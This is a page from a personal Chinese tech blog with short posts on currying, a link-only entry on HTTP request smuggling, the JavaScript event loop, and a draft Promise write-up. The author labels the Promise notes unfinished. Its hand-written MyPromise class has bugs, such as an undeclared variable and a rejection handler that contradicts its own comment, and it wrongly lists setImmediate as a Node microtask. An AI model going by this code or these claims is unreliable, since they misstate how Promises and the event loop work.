<li><p><a href="https://github.com/mqyqingfeng/Blog/issues/42" target="_blank" rel="noopener">JavaScript专题之函数柯里化</a></p>
</li>
<li><p><a href="https://github.com/xitu/gold-miner/blob/master/TODO/functors-categories.md" target="_blank" rel="noopener">掘金翻译：Functor 与 Category （软件编写）（第六部分）</a></p>
</li>
</ul>
<p>其他等待理解的</p>
<ul>
<li>图灵机完备</li>
<li>lamda 演算</li>
<li>SICP</li>
<li>Haskell</li>
<li>Monald</li>
</ul>

    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/10/http-smuggling/" itemprop="url">HTTP 请求走私</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-10T03:00:40.000Z" itemprop="datePublished">12月 10 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            几秒 读完 (约 15 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>参考：</p>
<ul>
<li><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">知道创宇：HTTP 走私</a></li>
</ul>

    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/08/stack-heap/" itemprop="url">JavaScript 的运行机制</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-08T06:05:10.000Z" itemprop="datePublished">12月 8 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            1 分钟 读完 (约 141 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>参考： </p>
<ul>
<li><p><a href="http://latentflip.com/loupe/?code=JC5vbignYnV0dG9uJywgJ2NsaWNrJywgZnVuY3Rpb24gb25DbGljaygpIHsKICAgIHNldFRpbWVvdXQoZnVuY3Rpb24gdGltZXIoKSB7CiAgICAgICAgY29uc29sZS5sb2coJ1lvdSBjbGlja2VkIHRoZSBidXR0b24hJyk7ICAgIAogICAgfSwgMjAwMCk7Cn0pOwoKY29uc29sZS5sb2coIkhpISIpOwoKc2V0VGltZW91dChmdW5jdGlvbiB0aW1lb3V0KCkgewogICAgY29uc29sZS5sb2coIkNsaWNrIHRoZSBidXR0b24hIik7Cn0sIDUwMDApOwoKY29uc29sZS5sb2coIldlbGNvbWUgdG8gbG91cGUuIik7!!!PGJ1dHRvbj5DbGljayBtZSE8L2J1dHRvbj4%3D" target="_blank" rel="noopener">Philip Roberts 制作的一个实时监控代码中 Event Loop 的监控页面</a></p>
</li>
<li><p><a href="https://www.zhihu.com/search?type=content&q=javaScript%20%E4%B8%AD%E7%9A%84%E5%A0%86%E6%A0%88" target="_blank" rel="noopener">知乎： JavaScript 中的堆栈</a></p>
</li>
<li><p><a href="https://youtu.be/8aGhZQkoFbQ" target="_blank" rel="noopener">JSConf 2014 Philip Roberts 关于 Event Loop 的解释</a></p>
</li>
<li><p><a href="http://www.ruanyifeng.com/blog/2013/11/stack.html" target="_blank" rel="noopener">阮一峰：Stack 的三种含义</a></p>
</li>
</ul>

    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/06/promise/" itemprop="url">Promise 碎片 （等待整理）</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-06T06:43:38.000Z" itemprop="datePublished">12月 6 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            9 分钟 读完 (约 1320 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <blockquote>
<p>我所做的一切，不过是在取悦一个影子</p>
</blockquote>
<h3 id="什么是-Promise"><a href="#什么是-Promise" class="headerlink" title="什么是 Promise ?"></a>什么是 Promise ?</h3><ol>
<li>定义：Promise 是一个对象，他会在未来的某个时刻生成一个值，已完成 （resolved）的值或者一个没有完成的理由。</li>
<li>特性：Promise 存在三个状态  FULLFILLED （已完成）、REJECTED （已拒绝）、PENDING （等待中）</li>
<li>回调：Promise 的使用者可以附上回调函数来处理已完成的值或者拒绝的原因</li>
</ol>
<p>Promise 是热切的，一旦 promise 的构造函数被调用，它就会开始执行你交给它的任务。如果你需要一个懒惰的，请看 <a href="https://github.com/Reactive-Extensions/RxJS" target="_blank" rel="noopener">observables</a> 或者 <a href="https://github.com/rpominov/fun-task" target="_blank" rel="noopener">task</a>。</p>
<p><img src="https://raw.githubusercontent.com/EPSON-LEE/image-hosting/master/WeChat6f9e35474509f44dc8831b91563615d0.png" alt></p>
<h3 id="Promise-用法"><a href="#Promise-用法" class="headerlink" title="Promise 用法"></a>Promise 用法</h3><p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="hljs-keyword">const</span> promise = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="hljs-comment">// Your code</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-comment">/* 异步操作成功 */</span>) &#123;</span><br><span class="line">    resolve(value)</span><br><span class="line">  &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">    reject(value)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">promise.then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) </span>&#123;</span><br><span class="line">  <span class="hljs-comment">// success</span></span><br><span class="line">&#125;, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">error</span>) </span>&#123;</span><br><span class="line">  <span class="hljs-comment">// error</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/EPSON-LEE/image-hosting/master/20191206182531.png" alt="Promise Polifil"></p>
<h3 id="Promise-API"><a href="#Promise-API" class="headerlink" title="Promise API"></a>Promise API</h3><p>Promise 规范有很多，Promise A、 Promise B、 Promise A+、Promise D</p>
<p>目前 ES6 的 Promise 是基于 Promise A+ 实现的</p>
<p>我们知道 Promise 是一个构造函数，需要用 new 调用，并有以下几个 api：( 从哪里知道？ 怎么知道？)</p>
<p>API: </p>
<p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Promise</span>(<span class="hljs-params">resolver</span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">Promise</span>.prototype.then = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">onResolved</span>) </span>&#123;&#125;</span><br><span class="line"><span class="hljs-built_in">Promise</span>.prototype.catch = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">onRejected</span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">Promise</span>.resolve = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="hljs-built_in">Promise</span>.reject = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="hljs-built_in">Promise</span>.race = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="hljs-built_in">Promise</span>.all = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure></p>
<p>同步任务（存放在执行栈）</p>
<p>异步任务 （存放在异步队列） 异步任务又分为宏任务和微任务</p>
<p>Chrome: </p>
<blockquote>
<p>宏任务 Task: setTimeout setInterval setImmediate(IE专用) messageChannel</p>
</blockquote>
<p>等待执行栈和微任务队列都执行完毕才会执行，并且在执行完每一个宏任务之后，会去看看微任务队列有没有新添加的任务，如果有，会先将微任务队列中的任务清空，才会继续执行下一个宏任务</p>
<blockquote>
<p>微任务 microTask：promise MutationObserver…</p>
</blockquote>
<p>当执行栈中的代码执行完毕，会在执行宏任务队列之前先看看微任务队列中有没有任务，如果有会先将微任务队列中的任务清空才会去执行宏任务队列</p>
<p>Node: </p>
<blockquote>
<p>宏任务 Task: setTimeout setInterval…</p>
</blockquote>
<blockquote>
<p>微任务 microTask: process.nextTric promise setImmediate</p>
</blockquote>
<p><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> isFulfilled = <span class="hljs-literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> d = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">resolve, reject</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    resolve(<span class="hljs-number">2</span>);</span><br><span class="line"></span><br><span class="line">    isFulfilled = <span class="hljs-literal">true</span>;</span><br><span class="line"></span><br><span class="line">  &#125;, <span class="hljs-number">50</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">d.then(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">onFulfilled</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">console</span>.log(isFulfilled == <span class="hljs-literal">true</span>)</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>Promise 的零碎实现： </p>
<p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> PENDING = <span class="hljs-string">"PENDING"</span></span><br><span class="line"><span class="hljs-keyword">const</span> RESOLVED = <span class="hljs-string">"RESOLVED"</span></span><br><span class="line"><span class="hljs-keyword">const</span> REJECTED = <span class="hljs-string">"REJECTED"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 值穿透</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 构造函数</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyPromise</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">constructor</span>(exexutor) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">this</span>.status = PENDING</span><br><span class="line">    <span class="hljs-keyword">this</span>.value = <span class="hljs-literal">undefined</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// 回调函数</span></span><br><span class="line">    <span class="hljs-keyword">this</span>.onResolvedCallback = []</span><br><span class="line">    <span class="hljs-keyword">this</span>.onRejectedCallback = []</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// inner resolve</span></span><br><span class="line">    <span class="hljs-keyword">let</span> _resolved = <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">       * 这里增加 setTimeout 是为了避免这种情况的出现</span></span><br><span class="line"><span class="hljs-comment">       *  promise2 = new MyPromise(function(resolve, reject) &#123;</span></span><br><span class="line"><span class="hljs-comment">       *    promise2().then(() =&gt; &#123;</span></span><br><span class="line"><span class="hljs-comment">       *      console.log(1111)</span></span><br><span class="line"><span class="hljs-comment">       *    &#125;)</span></span><br><span class="line"><span class="hljs-comment">       *  &#125;)</span></span><br><span class="line"><span class="hljs-comment">       * </span></span><br><span class="line"><span class="hljs-comment">       */</span></span><br><span class="line">      setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.status === PENDING) &#123;</span><br><span class="line">          <span class="hljs-keyword">this</span>.status = RESOLVED</span><br><span class="line">          <span class="hljs-keyword">this</span>.value = value</span><br><span class="line">          <span class="hljs-comment">// 针对非链式调用</span></span><br><span class="line">          <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">           * P = new Promise()</span></span><br><span class="line"><span class="hljs-comment">           * </span></span><br><span class="line"><span class="hljs-comment">           * P.then()</span></span><br><span class="line"><span class="hljs-comment">           * </span></span><br><span class="line"><span class="hljs-comment">           * P.then()</span></span><br><span class="line"><span class="hljs-comment">           */</span></span><br><span class="line">          <span class="hljs-keyword">this</span>.onResolvedCallback.forEach(<span class="hljs-function"><span class="hljs-params">cb</span> =&gt;</span> cb(value))</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// inner reject</span></span><br><span class="line">    <span class="hljs-keyword">let</span> _rejected = <span class="hljs-function">(<span class="hljs-params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.status === PENDING) &#123;</span><br><span class="line">        <span class="hljs-keyword">this</span>.status = REJECTED</span><br><span class="line">        <span class="hljs-keyword">this</span>.value = reason</span><br><span class="line">          <span class="hljs-comment">// 针对非链式调用</span></span><br><span class="line">        <span class="hljs-keyword">this</span>.onRejectedCallback.forEach(<span class="hljs-function"><span class="hljs-params">cb</span> =&gt;</span> cb(reason))</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">      exexutor(_resolved, _rejected)</span><br><span class="line">    &#125; <span class="hljs-keyword">catch</span> (err) &#123;</span><br><span class="line">      _rejected(err)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">// 原型链表</span></span><br><span class="line">  then(onResolved, onRejected) &#123;</span><br><span class="line">    <span class="hljs-keyword">let</span> promise2</span><br><span class="line">    <span class="hljs-keyword">let</span> self = <span class="hljs-keyword">this</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// 根据标准规定, 如果 then 的参数不是一个函数那么, 就抛出</span></span><br><span class="line">    onResolved = <span class="hljs-keyword">typeof</span> onResolved === <span class="hljs-string">'function'</span> ? onResolved : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">value</span>) </span>&#123; <span class="hljs-keyword">return</span> value &#125;</span><br><span class="line">    onRejected = <span class="hljs-keyword">typeof</span> onRejected === <span class="hljs-string">'function'</span> ? onRejected : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">reason</span>) </span>&#123; <span class="hljs-keyword">return</span> reason &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.status === PENDING) &#123;</span><br><span class="line">      <span class="hljs-comment">// 如果当前的Promise还处于pending状态，我们并不能确定调用onResolved还是onRejected，</span></span><br><span class="line">      <span class="hljs-comment">// 只能等到Promise的状态确定后，才能确实如何处理。</span></span><br><span class="line">      <span class="hljs-comment">// 所以我们需要把我们的**两种情况**的处理逻辑做为callback放入promise1(此处即this/self)的回调数组里</span></span><br><span class="line">      <span class="hljs-comment">// 逻辑本身跟第一个if块内的几乎一致，此处不做过多解释</span></span><br><span class="line">      <span class="hljs-keyword">return</span> promise2 = <span class="hljs-keyword">new</span> MyPromise(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">resolve, reject</span>) </span>&#123;</span><br><span class="line">        self.onResolvedCallback.push(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">value</span>) </span>&#123;</span><br><span class="line">          <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            <span class="hljs-keyword">var</span> x = onResolved(self.value)</span><br><span class="line">            <span class="hljs-keyword">if</span> (x <span class="hljs-keyword">instanceof</span> MyPromise) &#123;</span><br><span class="line">              x.then(resolve, reject)</span><br><span class="line">            &#125;</span><br><span class="line">            resolve(x)</span><br><span class="line">          &#125; <span class="hljs-keyword">catch</span> (e) &#123;</span><br><span class="line">            reject(e)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        self.onRejectedCallback.push(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">reason</span>) </span>&#123;</span><br><span class="line">          <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            <span class="hljs-keyword">var</span> x = onRejected(self.value)</span><br><span class="line">            <span class="hljs-keyword">if</span> (x <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Promise</span>) &#123;</span><br><span class="line">              x.then(resolve, reject)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125; <span class="hljs-keyword">catch</span> (e) &#123;</span><br><span class="line">            reject(e)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.status === RESOLVED) &#123;</span><br><span class="line">      <span class="hljs-keyword">return</span> promise2 = <span class="hljs-keyword">new</span> MyPromise(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">resolve, rejected</span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">          x = onResolved(self.value)</span><br><span class="line">          <span class="hljs-keyword">if</span> (x <span class="hljs-keyword">instanceof</span> MyPromise) &#123; <span class="hljs-comment">// 如果onResolved的返回值是一个Promise对象，直接取它的结果做为promise2的结果</span></span><br><span class="line">            x.then(resolve, rejected)</span><br><span class="line">          &#125;</span><br><span class="line">          resolve(x) <span class="hljs-comment">// 否则，以它的返回值做为promise2的结果</span></span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (err) &#123;</span><br><span class="line">          rejected(err)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.status === REJECTED) &#123;</span><br><span class="line">      <span class="hljs-keyword">return</span> promise2 = <span class="hljs-keyword">new</span> MyPromise(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">resolve, rejected</span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">          x = onRejected(self.value)</span><br><span class="line">          <span class="hljs-keyword">if</span> (x <span class="hljs-keyword">instanceof</span> MyPromise) &#123; <span class="hljs-comment">// 如果onResolved的返回值是一个Promise对象，直接取它的结果做为promise2的结果</span></span><br><span class="line">            x.then(resolve, rejected)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (err) &#123;</span><br><span class="line">          rejected(err)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// then 方法</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> isFulfilled = <span class="hljs-literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> d = <span class="hljs-keyword">new</span> MyPromise(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">resolve, reject</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    resolve(<span class="hljs-number">2</span>);</span><br><span class="line"></span><br><span class="line">    isFulfilled = <span class="hljs-literal">true</span>;</span><br><span class="line"></span><br><span class="line">  &#125;, <span class="hljs-number">50</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">d.then(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">onFulfilled</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">console</span>.log(isFulfilled == <span class="hljs-literal">true</span>)</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 测试</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> promise = <span class="hljs-keyword">new</span> MyPromise(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">resolve, rejected</span>) </span>&#123;</span><br><span class="line">  setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'pending'</span>)</span><br><span class="line">    resolve()</span><br><span class="line">  &#125;, <span class="hljs-number">1000</span>);</span><br><span class="line">&#125;).then(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="hljs-built_in">console</span>.log(<span class="hljs-number">2</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> promise2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">resolve, rejected</span>) </span>&#123;</span><br><span class="line">  setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'pending'</span>)</span><br><span class="line">    resolve()</span><br><span class="line">  &#125;, <span class="hljs-number">1000</span>);</span><br><span class="line">&#125;).then(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="hljs-built_in">console</span>.log(<span class="hljs-number">2</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>参考</p>
<ul>
<li><a href="https://juejin.im/post/5d59757f6fb9a06ae76405c6" target="_blank" rel="noopener">从零一步一步实现一个完整版的Promise</a></li>
<li><a href="https://juejin.im/post/5aa7868b6fb9a028dd4de672" target="_blank" rel="noopener">https://juejin.im/post/5aa7868b6fb9a028dd4de672</a></li>
</ul>
<ul>
<li><a href="https://malcolmyu.github.io/2015/06/12/Promises-A-Plus/" target="_blank" rel="noopener">Promise A+ 规范</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/21834559" target="_blank" rel="noopener">史上最易读懂的 Promise/A+ 完全实现</a></li>
<li><a href="https://github.com/xieranmaya/blog/issues/3" target="_blank" rel="noopener">剖析Promise内部结构，一步一步实现一个完整的、能通过所有Test case的Promise类</a></li>
</ul>
<p>后续</p>
<ul>
<li><a href="https://github.com/xieranmaya/blog/issues/5" target="_blank" rel="noopener">从如何停掉 promise 链说起</a></li>
</ul>
<p>拓展</p>
<ul>
<li><a href="https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/" target="_blank" rel="noopener">国内绝大部分 Task MicroTask 的来源</a></li>
<li><a href="https://github.com/folktale/data.task/blob/master/lib/task.js" target="_blank" rel="noopener">评论区：Monad的Data.task 实现Promise </a></li>
</ul>

    
    </div>
    
    
</article>




    
    
        
<nav class="pagination is-centered is-rounded" role="navigation" aria-label="pagination">
    <div class="pagination-previous">
        <a href="/o/">上一页</a>
    </div>
    <div class="pagination-next">
        <a href="/o/page/3/">下一页</a>
    </div>
    <ul class="pagination-list is-hidden-mobile">
        
        <li><a class="pagination-link" href="/o/">1</a></li>
        
        <li><a class="pagination-link is-current" href="/o/page/2/">2</a></li>
        
        <li><a class="pagination-link" href="/o/page/3/">3</a></li>
        
    </ul>
</nav>
    
    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2020 leejiahao&nbsp;
                我所做的一切，不过是在取悦一个影子 </a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/EPSON-LEE" target="_blank" rel="noopener">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
